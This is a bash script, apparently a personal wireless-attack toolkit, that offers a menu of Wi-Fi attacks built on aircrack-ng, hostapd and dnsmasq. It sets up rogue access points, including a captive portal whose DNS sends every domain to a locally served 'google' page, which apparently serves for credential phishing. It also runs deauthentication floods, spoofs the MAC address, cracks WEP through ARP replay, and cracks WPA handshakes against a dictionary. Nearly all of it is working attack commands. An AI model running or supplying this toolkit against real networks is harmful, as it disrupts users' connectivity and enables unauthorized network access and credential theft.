#!/bin/bash

# colours
fincolor='\e[0m'
rojo='\e[0;31m'
amarillo='\e[0;33m'
azul='\e[0;34m'
azul2='\e[1;34m'
blanco='\e[0m'
verde='\e[1;32m'


echo -e $azul  " ------------------------------------------------------------------------ " $fincolor
echo -e $azul  "|                                                                        | " $fincolor
echo -e $azul  "|                  _______ _____ _______                   ___   █   █   |  " $fincolor
echo -e $azul  "|  \      /\      /   |    |        |             /| |    /   \   █ █    |  " $fincolor
echo -e $azul  "|   \    /  \    /    |    |__      |     ----   / | |   |  _  |   █     |  " $fincolor
echo -e $azul  "|    \  /    \  /     |    |        |           /__| |   |     |  █ █    | " $fincolor
echo -e $azul  "|     \/      \/   ___|____|     ___|___           | |___ \___/  █   █   | " $fincolor
echo -e $azul  "|                                                                        | " $fincolor
echo -e $azul  " ------------------------------------------------------------------------ " $fincolor
echo -e
echo -e        "                                                           Alonso Martinez"
echo -e

# Install
which dnsmasq >/dev/null 2>&1 || apt-get install dnsmasq -y >>/dev/null

which hostapd >/dev/null 2>&1 || apt-get install hostapd -y >> /dev/null

which airmon-ng >/dev/null 2>&1 || apt-get install aircrack-ng -y >> /dev/null

which xterm >/dev/null 2>&1 || sudo apt-get install xterm -y >> /dev/null

number=1
while [ $number -gt 0 ]
do
echo -e
echo -e $rojo "--------------------------------MAIN MENU--------------------------------" $fincolor
echo -e "1 - Access Point"
echo -e "2 - Captive Portal"
echo -e "3 - Change MAC Address"
echo -e "4 - Capture network packets"
echo -e "5 - Deauthentication attack"
echo -e "6 - WEP attack"
echo -e "7 - PSK attack"
echo -e "0 - Exit"
echo -e
echo -e $amarillo "Choose an option:" $fincolor
read number

echo -e
	if [ $number -eq 1 ]
	then
		echo -e $rojo "----Create an access point----" $fincolor
	elif [ $number -eq 2 ]
	then
	        echo -e $rojo "----Create a captive portal----" $fincolor
        elif [ $number -eq 3 ]
        then
                echo -e $rojo "--------- Change MAC ---------" $fincolor
	elif [ $number -eq 0 ]
	then
		echo -e $verde "---Exit---"
		exit 0
	fi

		inter=`ifconfig -a | awk '/^[a-zA-Z0-9]/{print $1}' | cut -d ':' -f 1` 
		lineas=`echo "$inter" | wc -l`
		echo -e $amarillo "Available interfaces:" $fincolor
		echo "$inter" | cat -n
		echo -e $amarillo "Choose an interface: " $fincolor
		read opcion

echo -e
		if [ "$opcion" -ge 1 ] && [ "$opcion" -le "$lineas" ]; then

		    interfaz=$(echo "$inter" | sed -n "${opcion}p")
		    echo "Interface: $interfaz"
		else
		    echo "Invalid option"
		fi

	#comprobar modo monito
echo -e
	info=$(iwconfig "$interfaz" 2>/dev/null)

	if [[ "$info" == *"Mode:Monitor"* || "$info" == *"Mode:Master"* ]]; then
	    echo -e $verde "The interface $interfaz is in monitor mode." $fincolor
	else
#Si no esta en modo monitor repetimos lo anterior para confirmar el nuevo nombre de la interfaz
	    echo -e $verde "The interface $interfaz is not monitor mode." $fincolor
		sleep 1
		echo -e $azul "Enabling monitor mode..."
		sleep 1
		echo -e

ifconfig $interfaz down
iwconfig $interfaz mode monitor
ifconfig $interfaz up

		inter=`ifconfig -a | awk '/^[a-zA-Z0-9]/{print $1}' | cut -d ':' -f 1` 
                lineas=`echo "$inter" | wc -l`
                echo -e $amarillo "Available interfaces:" $fincolor
                echo "$inter" | cat -n
                echo -e $amarillo "Choose an interface: " $fincolor
                read opcion
echo -e
                if [ "$opcion" -ge 1 ] && [ "$opcion" -le "$lineas" ]; then

                    interfaz=$(echo "$inter" | sed -n "${opcion}p")
                    echo "Interface: $interfaz"
                else
                    echo "Invalid option"
                fi

	fi
sleep 3

case $number in
        1)
	        ifconfig $interfaz 200.200.200.1 netmask 255.255.255.0
        	route add -net 200.200.200.0 netmask 255.255.255.0 gw 200.200.200.1 2>/dev/null
		echo 1 > /proc/sys/net/ipv4/ip_forward

		iptables -P FORWARD ACCEPT
		iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

        echo -e "Network name: "
        read red

		#CONFIG
host="interface=$interfaz
driver=nl80211
ssid=$red
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0"
archivoHost="hostapd.conf"

echo "$host" > "$archivoHost"


sleep 2
	xterm -e "hostapd hostapd.conf" &

sleep 2

dns="interface=$interfaz
dhcp-range=200.200.200.2,200.200.200.10,255.255.255.0,12h
dhcp-option=3,200.200.200.1
dhcp-option=6,8.8.8.8
server=8.8.8.8
log-queries
log-dhcp
address=/#/200.200.200.1"
archivoDNS="dnsmasq.conf"

echo "$dns" > "$archivoDNS"

sleep 2
		xterm -e "dnsmasq -C dnsmasq.conf -d" &

sleep 2
echo -e
	echo -e $azul2 "ACCESS POINT OPEN" $fincolor
	;;

2)
        ifconfig $interfaz 200.200.200.1 netmask 255.255.255.0
        route add -net 200.200.200.0 netmask 255.255.255.0 gw 200.200.200.1 2>/dev/null


	echo -e "Create a captive portal"

	echo -e "Network name: "
	read red

                #CONFIG
host="interface=$interfaz
driver=nl80211
ssid=$red
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0"
archivoHost="hostapd.conf"

echo "$host" > "$archivoHost"


        xterm -e "hostapd hostapd.conf" &


dns="interface=$interfaz
dhcp-range=200.200.200.2,200.200.200.10,255.255.255.0,12h
dhcp-option=3,200.200.200.1
dhcp-option=6,200.200.200.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/200.200.200.1"
archivoDNS="dnsmasq.conf"

echo "$dns" > "$archivoDNS"



sleep 3
                xterm -e "dnsmasq -C dnsmasq.conf -d" &

		xterm -e " cd google; php -S 200.200.200.1:80" &


	;;

3)
	echo -e
	ifconfig $interfaz down
	sleep 2
	macchanger -a $interfaz
	ifconfig $interfaz up
	sleep 2


	;;

4)
	echo -e 
	xterm -e "airodump-ng $interfaz --band abg"
	;;
5)
	xterm -hold -e "airodump-ng $interfaz --band abg" &
sleep 3

        echo -e "BSSID:"
        read bssid

	xterm -hold -e "aireplay-ng -0 15 -a $bssid $interfaz" &
sleep 5

;;
6)


	xterm -e "airodump-ng $interfaz --band abg" 

	echo -e "Número de canal:"
	read canal

	echo -e "BSSID:"
	read bssid

	echo -e " --- Select mode --- "
	echo -e "1 - Automatic"
	echo -e "2 - Manual"
	read mode

	if [ $mode -eq 1 ]
	then
		#besside es la forma automatica
		xterm -hold -e "besside-ng -c $canal -b $bssid $interfaz -v"

		echo -e "Key in besside.log"
		elif [ $mode -eq 2 ]
		then 
		xterm -e "airodump-ng -c $canal -b $bssid -w dump $interfaz" &
sleep 2
		xterm -e "aireplay-ng -1 3600 -q 10 -a $bssid $interfaz" &
sleep 2
		xterm -e "aireplay-ng --arpreplay -b $bssid -h BA:49:A9:53:A1:8C $interfaz" &
		echo -e "sniffing packages..."
sleep 10
		echo -e $azul "Choose file"
		file=`zenity --file-selection 2> /dev/null`
		xterm -e "aircrack-ng $file | tee wep-pass.txt" &
	fi
;;


7)
        xterm -e "airodump-ng $interfaz --band abg" &

        echo -e "Número de canal:"
        read canal

        echo -e "BSSID:"
        read bssid

	xterm -e "airodump-ng $interfaz -w dump -c $canal --bssid $bssid --wps" &
sleep 5
	xterm -hold -e "aireplay-ng -0 10 -a $bssid $interfaz" &
sleep 5
		echo -e $azul "Choose dump file"
                file=`zenity --file-selection 2> /dev/null`
		echo -e $azul "Choose dictionary"
                dic=`zenity --file-selection 2> /dev/null`

                xterm -hold -e "aircrack-ng $file -w $dic"



;;
	*)
	echo -e "Number is not valid"
	;;
	0)
	echo -e "BYE"


esac

done
